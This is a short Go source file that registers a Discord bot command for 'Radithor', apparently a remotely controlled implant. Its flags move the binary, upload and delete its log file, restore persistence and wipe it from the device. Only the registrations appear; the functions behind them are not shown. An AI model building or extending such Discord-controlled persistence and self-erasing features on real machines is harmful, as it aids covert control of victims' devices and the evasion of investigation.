package commands_this

import "radithor/bot/discord"

func (cmd *RadCommand) Exec(ctx *discord.CommandContext, args []string) {
	if len(args) < 1 {
		ctx.ReplyMsg("You need to provide a flag.")
		return
	}

	cmd.RunFlag(ctx, args[0], args[1:])
}

func (*RadCommand) Name() string {
	return "this"
}

func (*RadCommand) Info() string {
	return "Do things with the current Radithor binary." // how else am i supposed to word this cuh
}

func NewThisCommand() *RadCommand {
	cmd := &RadCommand{}

	cmd.AddFlag("move", "Moves the Radithor file to another location.", move)
	cmd.AddFlag("logs", "Uploads the Radithor log file and deletes it.", logs)
	cmd.AddFlag("persist", "Persists Radithor if it was disabled.", persist)
	cmd.AddFlag("wipe", "Securely removes Radithor from the device.", wipe)

	return cmd
}

type RadCommand struct {
	discord.FlagCommand
}
